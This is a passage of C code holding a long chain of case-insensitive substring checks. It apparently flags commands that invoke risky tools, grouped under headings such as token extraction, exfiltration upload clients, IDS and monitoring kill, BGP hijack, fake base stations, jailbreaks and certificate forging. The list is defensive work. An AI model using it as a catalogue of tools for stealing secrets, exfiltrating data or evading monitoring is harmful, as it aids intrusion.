            ci_contains(text, "tdbtool") ||
            (ci_contains(text, "exportfs") && ci_contains(text, " -")) ||
            ci_contains(text, "cadaver") ||
            ci_contains(text, "printerbug") ||
            /* kerberos material + tpm/hsm */
            ci_contains(text, "k5srvutil") ||
            ci_contains(text, "kprop") ||
            ci_contains(text, "kdb5_util") ||
            ci_contains(text, "krb5kdc") ||
            ci_contains(text, "kswitch") ||
            ci_contains(text, "kpasswd") ||
            ci_contains(text, "kvno") ||
            ci_contains(text, "ksu") ||
            ci_contains(text, "ktab") ||
            ci_contains(text, "gssproxy") ||
            ci_contains(text, "cifscreds") ||
            (ci_contains(text, "request-key") &&
             (ci_contains(text, " create") || ci_contains(text, " update") ||
              ci_contains(text, " instantiate") || ci_contains(text, " revoke") ||
              ci_contains(text, " clear"))) ||
            ci_contains(text, "softhsm2-util") ||
            ci_contains(text, "pcscd") ||
            ci_contains(text, "scdaemon") ||
            ci_contains(text, "tcsd") ||
            ci_contains(text, "swtpm") ||
            ci_contains(text, "tpm2_create") ||
            ci_contains(text, "tpm2_load") ||
            ci_contains(text, "tpm2_sign") ||
            ci_contains(text, "tpm2_unseal") ||
            ci_contains(text, "tpm2_pcrread") ||
            ci_contains(text, "tpm2_nvread") ||
            ci_contains(text, "tpm2_nvwrite") ||
            ci_contains(text, "tpm2_flushcontext") ||
            /* ca / cert forge tooling */
            ci_contains(text, "cfssl") ||
            ci_contains(text, "cfssljson") ||
            ci_contains(text, "certstrap") ||
            ci_contains(text, "minica") ||
            ci_contains(text, "mkcert") ||
            ci_contains(text, "easyrsa") ||
            ci_contains(text, "certtool") ||
            ci_contains(text, "acme-client") ||
            ci_contains(text, "uacme") ||
            ci_contains(text, "acme.sh") ||
            (ci_contains(text, "step ca ") || ci_contains(text, "step certificate") ||
             ci_contains(text, "step ssh") || ci_contains(text, "step crypto")) ||
            ci_contains(text, "genkey") ||
            /* routing daemons (bgp/session hijack) */
            (ci_contains(text, "bird") && ci_contains(text, " -")) ||
            ci_contains(text, "birdc") ||
            ci_contains(text, "bird6") ||
            ci_contains(text, "frr") ||
            ci_contains(text, "vtysh") ||
            ci_contains(text, "bgpd") ||
            ci_contains(text, "ospfd") ||
            ci_contains(text, "ripd") ||
            ci_contains(text, "isisd") ||
            ci_contains(text, "ldpd") ||
            ci_contains(text, "nhrpd") ||
            ci_contains(text, "pimd") ||
            ci_contains(text, "pbrd") ||
            ci_contains(text, "staticd") ||
            (ci_contains(text, "zebra") && ci_contains(text, " -")) ||
            ci_contains(text, "babeld") ||
            ci_contains(text, "batctl") ||
            ci_contains(text, "olsrd") ||
            (ci_contains(text, "bmx") &&
             (ci_contains(text, " -") || ci_contains(text, "bmx6") ||
              ci_contains(text, "bmx7"))) ||
            ci_contains(text, "cjdns") ||
            ci_contains(text, "yggdrasil") ||
            ci_contains(text, "gobgp") ||
            ci_contains(text, "gobgpd") ||
            ci_contains(text, "exabgp") ||
            ci_contains(text, "quagga") ||
            ci_contains(text, "watchquagga") ||
            /* ids/av/monitoring kill + recon */
            ci_contains(text, "denyhosts") ||
            ci_contains(text, "sshguard") ||
            ci_contains(text, "crowdsec") ||
            ci_contains(text, "psad") ||
            ci_contains(text, "fwsnort") ||
            (ci_contains(text, "snort") && ci_contains(text, " -")) ||
            ci_contains(text, "suricata") ||
            (ci_contains(text, "zeek") && ci_contains(text, " -")) ||
            ci_contains(text, "clamav") ||
            ci_contains(text, "clamd") ||
            ci_contains(text, "freshclam") ||
            ci_contains(text, "maldet") ||
            ci_contains(text, "lynis") ||
            ci_contains(text, "rkhunter") ||
            ci_contains(text, "chkrootkit") ||
            (ci_contains(text, "unhide") &&
             (ci_contains(text, " proc") || ci_contains(text, " sys") ||
              ci_contains(text, " brute") || ci_contains(text, " pos") ||
              ci_contains(text, " quick") || ci_contains(text, " -"))) ||
            ci_contains(text, "telegraf") ||
            ci_contains(text, "collectd") ||
            ci_contains(text, "statsd") ||
            ci_contains(text, "zabbix") ||
            ci_contains(text, "nagios") ||
            ci_contains(text, "icinga") ||
            (ci_contains(text, "checkmk") && ci_contains(text, " -")) ||
            ci_contains(text, "node_exporter") ||
            ci_contains(text, "pushgateway") ||
            ci_contains(text, "alertmanager") ||
            ci_contains(text, "logstash") ||
            ci_contains(text, "fluentd") ||
            ci_contains(text, "fluent-bit") ||
            ci_contains(text, "filebeat") ||
            ci_contains(text, "metricbeat") ||
            ci_contains(text, "auditbeat") ||
            ci_contains(text, "winlogbeat") ||
            ci_contains(text, "nxlog") ||
            /* audit/selinux/attr recon */
            (ci_contains(text, "ausearch") && ci_contains(text, " -")) ||
            ci_contains(text, "aureport") ||
            ci_contains(text, "aulast") ||
            ci_contains(text, "aulastlog") ||
            ci_contains(text, "auvirt") ||
            ci_contains(text, "autrace") ||
            ci_contains(text, "secon") ||
            ci_contains(text, "sesearch") ||
            ci_contains(text, "seinfo") ||
            ci_contains(text, "findcon") ||
            ci_contains(text, "apol") ||
            ci_contains(text, "sedta") ||
            ci_contains(text, "sechecker") ||
            ci_contains(text, "setrans") ||
            ci_contains(text, "getpcaps") ||
            ci_contains(text, "filecap") ||
            ci_contains(text, "pscap") ||
            ci_contains(text, "setfattr") ||
            (ci_contains(text, "attr ") &&
             (ci_contains(text, " -s") || ci_contains(text, " -g"))) ||
            /* supervisor/daemon mgmt + busybox applets */
            ci_contains(text, "start-stop-daemon") ||
            ci_contains(text, "svscan") ||
            ci_contains(text, "svstat") ||
            ci_contains(text, "s6-svscan") ||
            ci_contains(text, "s6-svscanctl") ||
            ci_contains(text, "s6-rc") ||
            ci_contains(text, "svccfg") ||
            (ci_contains(text, "daemon") && ci_contains(text, " -")) ||
            ci_contains(text, "circusctl") ||
            ci_contains(text, "dtach") ||
            ci_contains(text, "abduco") ||
            ci_contains(text, "run0") ||
            (ci_contains(text, "toybox") &&
             (ci_contains(text, " sh") || ci_contains(text, " su") ||
              ci_contains(text, " install") || ci_contains(text, " -"))) ||
            (ci_contains(text, "busybox") &&
             (ci_contains(text, " tcpsvd") || ci_contains(text, " udpsvd") ||
              ci_contains(text, " inetd") || ci_contains(text, " ftpget") ||
              ci_contains(text, " dnsd") || ci_contains(text, " nbd"))) ||
            ci_contains(text, "debootstrap") ||
            ci_contains(text, "mmdebstrap") ||
            (ci_contains(text, "firejail") &&
             (ci_contains(text, " --noprofile") ||
              ci_contains(text, " --private") || ci_contains(text, " --net"))) ||
            ci_contains(text, "nsjail") ||
            ci_contains(text, "autoexpect") ||
            (ci_contains(text, "empty") && ci_contains(text, " -")) ||
            ci_contains(text, "pkttyagent") ||
            ci_contains(text, "pkaction") ||
            ci_contains(text, "pkcheck") ||
            ci_contains(text, "systemd-ask-password") ||
            ci_contains(text, "systemd-tty-ask-password-agent") ||
            ci_contains(text, "systemd-stdio-bridge") ||
            ci_contains(text, "systemd-socket-activate") ||
            ci_contains(text, "systemd-notify") ||
            ci_contains(text, "dbus-monitor") ||
            ci_contains(text, "qdbus") ||
            ci_contains(text, "d-feet") ||
            ci_contains(text, "dbus-launch") ||
            (ci_contains(text, "dbus-daemon") && ci_contains(text, " --")) ||
            /* gsm/fake-bts + sdr */
            (ci_contains(text, "yate ") && ci_contains(text, " -")) ||
            ci_contains(text, "yatebts") ||
            ci_contains(text, "openbts") ||
            ci_contains(text, "openbsc") ||
            ci_contains(text, "osmo-") ||
            ci_contains(text, "srsenb") ||
            ci_contains(text, "srsue") ||
            ci_contains(text, "srsepc") ||
            ci_contains(text, "srsgnb") ||
            ci_contains(text, "srsran") ||
            ci_contains(text, "lteenb") ||
            ci_contains(text, "ltemme") ||
            ci_contains(text, "open5gs") ||
            ci_contains(text, "free5gc") ||
            ci_contains(text, "nextepc") ||
            ci_contains(text, "openepc") ||
            ci_contains(text, "limesdr") ||
            ci_contains(text, "bladerf") ||
            ci_contains(text, "usrp") ||
            ci_contains(text, "uhd_") ||
            ci_contains(text, "soapysdr") ||
            ci_contains(text, "airspy") ||
            ci_contains(text, "sdrplay") ||
            ci_contains(text, "plutosdr") ||
            ci_contains(text, "gnuradio") ||
            ci_contains(text, "gqrx") ||
            ci_contains(text, "sdrpp") ||
            ci_contains(text, "sdrangel") ||
            ci_contains(text, "urh") ||
            ci_contains(text, "inspectrum") ||
            /* hardware/debug/flash-write */
            ci_contains(text, "jlink") ||
            ci_contains(text, "stlink") ||
            ci_contains(text, "st-flash") ||
            ci_contains(text, "st-info") ||
            ci_contains(text, "stm32flash") ||
            ci_contains(text, "stm32prog") ||
            ci_contains(text, "dfu-programmer") ||
            ci_contains(text, "dfu-prefix") ||
            ci_contains(text, "dfu-suffix") ||
            ci_contains(text, "teensyloader") ||
            ci_contains(text, "espefuse") ||
            ci_contains(text, "espsecure") ||
            ci_contains(text, "esp_rfc2217") ||
            ci_contains(text, "ampy") ||
            ci_contains(text, "mpremote") ||
            ci_contains(text, "nodemcu") ||
            ci_contains(text, "pyboard") ||
            ci_contains(text, "picotool") ||
            ci_contains(text, "picoprobe") ||
            ci_contains(text, "yosys") ||
            ci_contains(text, "nextpnr") ||
            ci_contains(text, "openfpgaloader") ||
            ci_contains(text, "xc3sprog") ||
            ci_contains(text, "urjtag") ||
            ci_contains(text, "jtagulator") ||
            ci_contains(text, "hydrabus") ||
            ci_contains(text, "buspirate") ||
            ci_contains(text, "sigrok-cli") ||
            ci_contains(text, "saleae") ||
            ci_contains(text, "ser2net") ||
            ci_contains(text, "picocom") ||
            (ci_contains(text, "odin ") && ci_contains(text, " -")) ||
            ci_contains(text, "spflashtool") ||
            ci_contains(text, "qfil") ||
            ci_contains(text, "miflash") ||
            (ci_contains(text, "sahara") && ci_contains(text, " -")) ||
            (ci_contains(text, "firehose") &&
             (ci_contains(text, " -") || ci_contains(text, ".xml"))) ||
            ci_contains(text, "qdload") ||
            ci_contains(text, "rkdeveloptool") ||
            ci_contains(text, "rkflashtool") ||
            ci_contains(text, "upgrade_tool") ||
            ci_contains(text, "phoenixsuit") ||
            ci_contains(text, "livesuit") ||
            ci_contains(text, "nanddump") ||
            ci_contains(text, "flash_erase") ||
            ci_contains(text, "flash_eraseall") ||
            ci_contains(text, "ubidetach") ||
            ci_contains(text, "ubimkvol") ||
            ci_contains(text, "ubirmvol") ||
            ci_contains(text, "ubiupdatevol") ||
            ci_contains(text, "flashcp") ||
            ci_contains(text, "flash_unlock") ||
            ci_contains(text, "flash_lock") ||
            ci_contains(text, "flash_otp") ||
            ci_contains(text, "ubinize") ||
            ci_contains(text, "ubiblock") ||
            ci_contains(text, "ubirename") ||
            ci_contains(text, "ubidump") ||
            ci_contains(text, "mtdinfo") ||
            ci_contains(text, "nftldump") ||
            ci_contains(text, "nftl_format") ||
            ci_contains(text, "rfddump") ||
            ci_contains(text, "rfdformat") ||
            ci_contains(text, "sumtool") ||
            ci_contains(text, "jffs2dump") ||
            ci_contains(text, "serve_image") ||
            ci_contains(text, "recv_image") ||
            /* ble/bt attack extras */
            ci_contains(text, "btcrack") ||
            ci_contains(text, "btcrawler") ||
            ci_contains(text, "bluelight") ||
            ci_contains(text, "blueborn") ||
            ci_contains(text, "gattacker") ||
            ci_contains(text, "btdump") ||
            ci_contains(text, "bluebug") ||
            ci_contains(text, "bluebugger") ||
            ci_contains(text, "bluepot") ||
            ci_contains(text, "bluescan") ||
            ci_contains(text, "bluesniff") ||
            ci_contains(text, "bluestumbler") ||
            ci_contains(text, "btinput") ||
            ci_contains(text, "carwhisperer") ||
            ci_contains(text, "hidattack") ||
            ci_contains(text, "keysnatch") ||
            ci_contains(text, "obexapp") ||
            ci_contains(text, "psm-scan") ||
            ci_contains(text, "rfcomm") ||
            ci_contains(text, "ubics") ||
            ci_contains(text, "btle") ||
            (ci_contains(text, "sniffle ") && ci_contains(text, " -")) ||
            ci_contains(text, "nrf-sniffer") ||
            ci_contains(text, "nrfconnect") ||
            ci_contains(text, "hackzwave") ||
            ci_contains(text, "wpanctl") ||
            /* mitm framework + firmware/re extraction */
            ci_contains(text, "mitmf") ||
            ci_contains(text, "cabextract") ||
            ci_contains(text, "unshield") ||
            ci_contains(text, "innoextract") ||
            ci_contains(text, "unsquashfs") ||
            ci_contains(text, "sasquatch") ||
            ci_contains(text, "jefferson") ||
            ci_contains(text, "ubi_reader") ||
            ci_contains(text, "ubireader") ||
            ci_contains(text, "fwanalyzer") ||
            ci_contains(text, "emba") ||
            ci_contains(text, "firmadyne") ||
            ci_contains(text, "firmwalker") ||
            ci_contains(text, "fmk") ||
            ci_contains(text, "pev") ||
            ci_contains(text, "pecheck") ||
            ci_contains(text, "peframe") ||
            ci_contains(text, "pedump") ||
            ci_contains(text, "pescan") ||
            ci_contains(text, "portex") ||
            ci_contains(text, "pe-bear") ||
            (ci_contains(text, "die ") && ci_contains(text, " -")) ||
            ci_contains(text, "diec") ||
            ci_contains(text, "exeinfo") ||
            ci_contains(text, "trid") ||
            ci_contains(text, "wxhex") ||
            ci_contains(text, "imhex") ||
            ci_contains(text, "zsteg") ||
            ci_contains(text, "pngcheck") ||
            ci_contains(text, "mediainfo") ||
            ci_contains(text, "ffprobe") ||
            ci_contains(text, "pdfinfo") ||
            ci_contains(text, "pdf-parser") ||
            ci_contains(text, "pdfid") ||
            ci_contains(text, "peepdf") ||
            ci_contains(text, "pdfxray") ||
            ci_contains(text, "pdfcpu") ||
            ci_contains(text, "oletools") ||
            ci_contains(text, "olevba") ||
            ci_contains(text, "oledump") ||
            ci_contains(text, "mraptor") ||
            ci_contains(text, "pcodedmp") ||
            ci_contains(text, "extract_msg") ||
            (ci_contains(text, "foca ") && ci_contains(text, " -")) ||
            ci_contains(text, "powermeta") ||
            /* ios jailbreak + loader names */
            ci_contains(text, "unc0ver") ||
            ci_contains(text, "taurine") ||
            ci_contains(text, "dopamine") ||
            (ci_contains(text, "odyssey") && ci_contains(text, " -")) ||
            (ci_contains(text, "chimera") && ci_contains(text, " -")) ||
            (ci_contains(text, "electra") && ci_contains(text, " -")) ||
            (ci_contains(text, "meridian") && ci_contains(text, " -")) ||
            ci_contains(text, "roothide") ||
            ci_contains(text, "nathanlr") ||
            ci_contains(text, "xina") ||
            ci_contains(text, "fugu") ||
            ci_contains(text, "limera1n") ||
            ci_contains(text, "blackra1n") ||
            ci_contains(text, "purplera1n") ||
            ci_contains(text, "redsn0w") ||
            ci_contains(text, "greenpois0n") ||
            (ci_contains(text, "absinthe") && ci_contains(text, " -")) ||
            (ci_contains(text, "evasion") && ci_contains(text, " -")) ||
            ci_contains(text, "pangu") ||
            ci_contains(text, "taig") ||
            (ci_contains(text, "phoenix") &&
             (ci_contains(text, " jb") || ci_contains(text, " jailbreak"))) ||
            ci_contains(text, "h3lix") ||
            ci_contains(text, "etason") ||
            ci_contains(text, "yalu") ||
            ci_contains(text, "mach_portal") ||
            ci_contains(text, "sileo") ||
            ci_contains(text, "cydia") ||
            ci_contains(text, "appmanager") ||
            ci_contains(text, "altserver") ||
            ci_contains(text, "sideloadly") ||
            ci_contains(text, "altstore") ||
            ci_contains(text, "trollstore") ||
            ci_contains(text, "filza") ||
            ci_contains(text, "newterm") ||
            ci_contains(text, "mtac") ||
            ci_contains(text, "oslog") ||
            ci_contains(text, "class-dump") ||
            ci_contains(text, "machoview") ||
            ci_contains(text, "cycript") ||
            (ci_contains(text, "clutch") && ci_contains(text, " -")) ||
            ci_contains(text, "bfinject") ||
            ci_contains(text, "ipainstaller") ||
            ci_contains(text, "appinst") ||
            /* android root/pinning-bypass */
            ci_contains(text, "kernelsu") ||
            ci_contains(text, "apatch") ||
            ci_contains(text, "shamiko") ||
            ci_contains(text, "zygisk") ||
            ci_contains(text, "riru") ||
            ci_contains(text, "lsposed") ||
            ci_contains(text, "edxposed") ||
            (ci_contains(text, "substrate") && ci_contains(text, " -")) ||
            ci_contains(text, "sslunpinning") ||
            ci_contains(text, "justtrustme") ||
            ci_contains(text, "vysor") ||
            ci_contains(text, "airdroid") ||
            /* anonymity/covert transports */
            ci_contains(text, "obfs4proxy") ||
            (ci_contains(text, "meek ") && ci_contains(text, " -")) ||
            (ci_contains(text, "snowflake") &&
             (ci_contains(text, "-client") || ci_contains(text, "-server") ||
              ci_contains(text, " -"))) ||
            ci_contains(text, "dnstt") ||
            (ci_contains(text, "hans ") && ci_contains(text, " -")) ||
            ci_contains(text, "speederv2") ||
            ci_contains(text, "tinyfecvpn") ||
            ci_contains(text, "udpspeeder") ||
            ci_contains(text, "gnunet") ||
            ci_contains(text, "freenet") ||
            ci_contains(text, "i2p") ||
            ci_contains(text, "zeronet") ||
            ci_contains(text, "nyx") ||
            ci_contains(text, "lyrebird") ||
            ci_contains(text, "stegotorus") ||
            ci_contains(text, "scramblesuit") ||
            ci_contains(text, "tapdance") ||
            ci_contains(text, "n2n") ||
            ci_contains(text, "freelan") ||
            ci_contains(text, "vtun") ||
            ci_contains(text, "openziti") ||
            (ci_contains(text, "ziti") &&
             (ci_contains(text, " edge") || ci_contains(text, " login") ||
              ci_contains(text, " router"))) ||
            (ci_contains(text, "wg") &&
             (ci_contains(text, " set ") || ci_contains(text, " show ") ||
              ci_contains(text, " syncconf") || ci_contains(text, " addconf"))) ||
            ci_contains(text, "spiped") ||
            (ci_contains(text, "stud ") && ci_contains(text, " -")) ||
            (ci_contains(text, "hitch ") && ci_contains(text, " -")) ||
            (ci_contains(text, "balance ") && ci_contains(text, " -")) ||
            /* proxy servers */
            ci_contains(text, "graftcp") ||
            ci_contains(text, "badvpn") ||
            (ci_contains(text, "dante") && ci_contains(text, " -")) ||
            ci_contains(text, "sockd") ||
            ci_contains(text, "ss5") ||
            ci_contains(text, "pproxy") ||
            ci_contains(text, "privoxy") ||
            ci_contains(text, "polipo") ||
            ci_contains(text, "tinyproxy") ||
            ci_contains(text, "paros") ||
            (ci_contains(text, "charles") && ci_contains(text, " -")) ||
            (ci_contains(text, "fiddler") && ci_contains(text, " -")) ||
            ci_contains(text, "mitmweb") ||
            /* phish kits + osint extras */
            ci_contains(text, "darkphish") ||
            ci_contains(text, "phishx") ||
            ci_contains(text, "websploit") ||
            ci_contains(text, "sn1per") ||
            ci_contains(text, "jaeles") ||
            ci_contains(text, "osmedeus") ||
            ci_contains(text, "reconftw") ||
            ci_contains(text, "rengine") ||
            ci_contains(text, "lazyrecon") ||
            ci_contains(text, "osrframework") ||
            ci_contains(text, "maltego") ||
            ci_contains(text, "casefile") ||
            ci_contains(text, "dmitry") ||
            (ci_contains(text, "creepy") && ci_contains(text, " -")) ||
            ci_contains(text, "eagleeye") ||
            ci_contains(text, "userrecon") ||
            ci_contains(text, "social-analyzer") ||
            ci_contains(text, "fofa") ||
            ci_contains(text, "zoomeye") ||
            ci_contains(text, "binaryedge") ||
            ci_contains(text, "netlas") ||
            ci_contains(text, "onyphe") ||
            ci_contains(text, "dnsdb") ||
            ci_contains(text, "passivetotal") ||
            ci_contains(text, "riskiq") ||
            ci_contains(text, "threatcrowd") ||
            ci_contains(text, "threatminer") ||
            ci_contains(text, "otx") ||
            (ci_contains(text, "hybrid-analysis") && ci_contains(text, " -")) ||
            ci_contains(text, "anyrun") ||
            ci_contains(text, "intezer") ||
            (ci_contains(text, "cuckoo") && ci_contains(text, " -")) ||
            ci_contains(text, "malwr") ||
            (ci_contains(text, "bazaar") && ci_contains(text, " -")) ||
            ci_contains(text, "malshare") ||
            ci_contains(text, "virusshare") ||
            ci_contains(text, "vxvault") ||
            ci_contains(text, "maltrieve") ||
            ci_contains(text, "thezoo") ||
            ci_contains(text, "vxcube") ||
            (ci_contains(text, "valhalla") && ci_contains(text, " -")) ||
            (ci_contains(text, "loki") && ci_contains(text, " -")) ||
            (ci_contains(text, "thor") && ci_contains(text, " -")) ||
            ci_contains(text, "altdns") ||
            ci_contains(text, "ctfr") ||
            ci_contains(text, "cero ") ||
            ci_contains(text, "dnsgen") ||
            ci_contains(text, "goaltdns") ||
            ci_contains(text, "gotator") ||
            ci_contains(text, "alterx") ||
            ci_contains(text, "puredns") ||
            ci_contains(text, "shuffledns") ||
            ci_contains(text, "dnsx") ||
            ci_contains(text, "bluto") ||
            ci_contains(text, "dnscan") ||
            ci_contains(text, "subscan") ||
            /* ebpf offensive tooling */
            ci_contains(text, "tracee") ||
            ci_contains(text, "inspektor-gadget") ||
            ci_contains(text, "ebpfkit") ||
            ci_contains(text, "triplecross") ||
            ci_contains(text, "bpfkexec") ||
            ci_contains(text, "badbpf") ||
            ci_contains(text, "bpfdos") ||
            ci_contains(text, "pamspy") ||
            /* elf patch + assembler/linker */
            ci_contains(text, "patchelf") ||
            ci_contains(text, "chrpath") ||
            ci_contains(text, "elfedit") ||
            ci_contains(text, "scanelf") ||
            ci_contains(text, "execstack") ||
            ci_contains(text, "paxctl") ||
            ci_contains(text, "prelink") ||
            ci_contains(text, "checksec") ||
            ci_contains(text, "pahole") ||
            ci_contains(text, "dwdebug") ||
            ci_contains(text, "eu-strip") ||
            ci_contains(text, "objcopy") ||
            (ci_contains(text, "nasm") &&
             (ci_contains(text, " -f") || ci_contains(text, " -o"))) ||
            ci_contains(text, "fasm") ||
            ci_contains(text, "yasm") ||
            ci_contains(text, "ml64") ||
            (ci_contains(text, "wcl ") && ci_contains(text, " -")) ||
            (ci_contains(text, "wcc") && ci_contains(text, " -")) ||
            (ci_contains(text, "wlink") && ci_contains(text, " -")) ||
            ci_contains(text, "sdcc") ||
            ci_contains(text, "sstrip") ||
            (ci_contains(text, "tcc") &&
             (ci_contains(text, " -o") || ci_contains(text, " -shared"))) ||
            /* secret-fetch + token-extraction clis */
            (ci_contains(text, "summon") && ci_contains(text, " -")) ||
            ci_contains(text, "envconsul") ||
            ci_contains(text, "vaultenv") ||
            (ci_contains(text, "chamber") && ci_contains(text, " -")) ||
            ci_contains(text, "credstash") ||
            (ci_contains(text, "teller") && ci_contains(text, " -")) ||
            ci_contains(text, "vals") ||
            ci_contains(text, "dotenvx") ||
            ci_contains(text, "envkey") ||
            ci_contains(text, "aws-vault") ||
            ci_contains(text, "awsume") ||
            ci_contains(text, "saml2aws") ||
            ci_contains(text, "gimme-aws-creds") ||
            (ci_contains(text, "okta") && ci_contains(text, " -")) ||
            ci_contains(text, "oauth2l") ||
            ci_contains(text, "oauth2c") ||
            (ci_contains(text, "flyctl") && ci_contains(text, " auth token")) ||
            (ci_contains(text, "fly") && ci_contains(text, " auth token")) ||
            (ci_contains(text, "heroku") && ci_contains(text, " auth:token")) ||
            (ci_contains(text, "az") && ci_contains(text, " get-access-token")) ||
            (ci_contains(text, "gcloud") &&
             ci_contains(text, " print-access-token")) ||
            (ci_contains(text, "kubectl") &&
             (ci_contains(text, " config view") ||
              ci_contains(text, " config use-context") ||
              ci_contains(text, " config set") ||
              ci_contains(text, " config unset"))) ||
            (ci_contains(text, "terraform") &&
             (ci_contains(text, " output") || ci_contains(text, " state ") ||
              ci_contains(text, " force-unlock") || ci_contains(text, " taint") ||
              ci_contains(text, " untaint"))) ||
            /* vcs + pkg-helper clis */
            ci_contains(text, "sfdx") ||
            (ci_contains(text, "sf") &&
             (ci_contains(text, " org ") || ci_contains(text, " force "))) ||
            (ci_contains(text, "tea") &&
             (ci_contains(text, " login") || ci_contains(text, " -"))) ||
            (ci_contains(text, "p4 ") &&
             (ci_contains(text, " sync") || ci_contains(text, " print") ||
              ci_contains(text, " edit") || ci_contains(text, " delete") ||
              ci_contains(text, " login") || ci_contains(text, " submit") ||
              ci_contains(text, " revert") || ci_contains(text, " opened"))) ||
            (ci_contains(text, "svn") &&
             (ci_contains(text, " export") || ci_contains(text, " cat ") ||
              ci_contains(text, " checkout") || ci_contains(text, " propset"))) ||
            (ci_contains(text, "hg") &&
             (ci_contains(text, " clone") || ci_contains(text, " cat ") ||
              ci_contains(text, " export") || ci_contains(text, " pull") ||
              ci_contains(text, " push"))) ||
            (ci_contains(text, "fossil") && ci_contains(text, " -")) ||
            ci_contains(text, "git-annex") ||
            ci_contains(text, "git-filter-repo") ||
            ci_contains(text, "bfg") ||
            ci_contains(text, "git-hound") ||
            (ci_contains(text, "sapling") && ci_contains(text, " -")) ||
            (ci_contains(text, "jj") &&
             (ci_contains(text, " git ") || ci_contains(text, " checkout") ||
              ci_contains(text, " squash") || ci_contains(text, " rebase"))) ||
            (ci_contains(text, "yay") && ci_contains(text, " -s")) ||
            (ci_contains(text, "paru") && ci_contains(text, " -s")) ||
            ci_contains(text, "yaourt") ||
            (ci_contains(text, "trizen") && ci_contains(text, " -s")) ||
            (ci_contains(text, "pikaur") && ci_contains(text, " -s")) ||
            (ci_contains(text, "aurman") && ci_contains(text, " -s")) ||
            (ci_contains(text, "pamac") &&
             (ci_contains(text, " install") || ci_contains(text, " remove") ||
              ci_contains(text, " build"))) ||
            (ci_contains(text, "guix") &&
             (ci_contains(text, " install") || ci_contains(text, " remove") ||
              ci_contains(text, " package") || ci_contains(text, " gc"))) ||
            (ci_contains(text, "sbopkg") && ci_contains(text, " -i")) ||
            ci_contains(text, "pkgtool") ||
            ci_contains(text, "installpkg") ||
            (ci_contains(text, "slpkg") && ci_contains(text, " -i")) ||
            ci_contains(text, "xbps-install") ||
            ci_contains(text, "xbps-remove") ||
            ci_contains(text, "urpmi") ||
            (ci_contains(text, "aptitude") &&
             (ci_contains(text, " install") || ci_contains(text, " remove") ||
              ci_contains(text, " purge"))) ||
            (ci_contains(text, "dpkg") &&
             (ci_contains(text, " -i") || ci_contains(text, " --install") ||
              ci_contains(text, " -r") || ci_contains(text, " --remove") ||
              ci_contains(text, " --purge"))) ||
            (ci_contains(text, "alien") &&
             (ci_contains(text, " -i") || ci_contains(text, " -r") ||
              ci_contains(text, " -d") || ci_contains(text, " -t"))) ||
            /* file watchers + session-spy + utmp/wtmp */
            ci_contains(text, "watchexec") ||
            (ci_contains(text, "entr ") && ci_contains(text, " -")) ||
            ci_contains(text, "fswatch") ||
            ci_contains(text, "inotifywait") ||
            ci_contains(text, "inotifywatch") ||
            ci_contains(text, "fanotify") ||
            ci_contains(text, "fsmon") ||
            (ci_contains(text, "watchman") && ci_contains(text, " -")) ||
            ci_contains(text, "viddy") ||
            (ci_contains(text, "reflex") && ci_contains(text, " -")) ||
            (ci_contains(text, "gazer ") && ci_contains(text, " -")) ||
            ci_contains(text, "utmpdump") ||
            ci_contains(text, "wtmpdump") ||
            ci_contains(text, "lastb") ||
            ci_contains(text, "dump-acct") ||
            ci_contains(text, "dump-utmp") ||
            ci_contains(text, "lastcomm") ||
            ci_contains(text, "acctcom") ||
            ci_contains(text, "lslogins") ||
            (ci_contains(text, "getent") &&
             (ci_contains(text, " passwd") || ci_contains(text, " shadow") ||
              ci_contains(text, " group") || ci_contains(text, " hosts"))) ||
            /* windows misc + fake-time + editor tunnel */
            (ci_contains(text, "winword") &&
             (ci_contains(text, " /q") || ci_contains(text, " /m") ||
              ci_contains(text, "http"))) ||
            (ci_contains(text, "excel") &&
             (ci_contains(text, " /e") || ci_contains(text, "http"))) ||
            ci_contains(text, "mspub") ||
            ci_contains(text, "msaccess") ||
            ci_contains(text, "odbcad32") ||
            ci_contains(text, "mobsync") ||
            ci_contains(text, "diantz") ||
            ci_contains(text, "printbrm") ||
            ci_contains(text, "winsat") ||
            ci_contains(text, "dxcap") ||
            (ci_contains(text, "cdb") && ci_contains(text, " -")) ||
            ci_contains(text, "ntsd") ||
            (ci_contains(text, "kd") && ci_contains(text, " -")) ||
            ci_contains(text, "dbgshell") ||
            (ci_contains(text, "code") &&
             (ci_contains(text, " tunnel user") ||
              ci_contains(text, " tunnel rename") ||
              ci_contains(text, " tunnel service") ||
              ci_contains(text, " tunnel unregister") ||
              ci_contains(text, " tunnel --") || ci_contains(text, " tunnel -"))) ||
            (ci_contains(text, "cursor") && ci_contains(text, " tunnel")) ||
            (ci_contains(text, "zed ") && ci_contains(text, " -")) ||
            ci_contains(text, "faketime") ||
            ci_contains(text, "datefudge") ||
            ci_contains(text, "libfaketime") ||
            /* file-sync/exfil upload clis */
            ci_contains(text, "megatools") ||
            ci_contains(text, "megacopy") ||
            ci_contains(text, "megaget") ||
            ci_contains(text, "megaput") ||
            ci_contains(text, "megarm") ||
            ci_contains(text, "megadl") ||
            ci_contains(text, "dbxcli") ||
            ci_contains(text, "gdrive") ||
            ci_contains(text, "odrive") ||
            ci_contains(text, "nextcloudcmd") ||
            ci_contains(text, "owncloudcmd") ||
            ci_contains(text, "seaf-cli") ||
            (ci_contains(text, "drive") &&
             (ci_contains(text, " push") || ci_contains(text, " pull") ||
              ci_contains(text, " upload"))) ||
            /* remote-desktop/ssh client + log pipeline */
            ci_contains(text, "winbox") ||
            ci_contains(text, "mremoteng") ||
            (ci_contains(text, "devolutions") && ci_contains(text, " -")) ||
            ci_contains(text, "xfreerdp") ||
            ci_contains(text, "wfreerdp") ||
            ci_contains(text, "rdesktop") ||
            ci_contains(text, "remmina") ||
            ci_contains(text, "rdpwrap") ||
            ci_contains(text, "mobaxterm") ||
            ci_contains(text, "smartty") ||
            ci_contains(text, "xshell") ||
            ci_contains(text, "securecrt") ||
            ci_contains(text, "bitvise") ||
            ci_contains(text, "superputty") ||
            ci_contains(text, "termius") ||
            (ci_contains(text, "terminus") && ci_contains(text, " -")) ||
            ci_contains(text, "termscp") ||
            ci_contains(text, "psftp") ||
            (ci_contains(text, "pageant") && ci_contains(text, " -")) ||
            (ci_contains(text, "kitty") &&
             (ci_contains(text, " -") || ci_contains(text, " @"))) ||
            (ci_contains(text, "putty") && ci_contains(text, " -")) ||
            (ci_contains(text, "tftp") &&
             (ci_contains(text, " -i") || ci_contains(text, " get") ||
              ci_contains(text, " put"))) ||
            (ci_contains(text, "axel") && ci_contains(text, " -")) ||
            ci_contains(text, "rsyslogd") ||
            ci_contains(text, "syslog-ng") ||
            /* clipboard + wayland/x11 control + kvm-share */
            ci_contains(text, "cliphist") ||
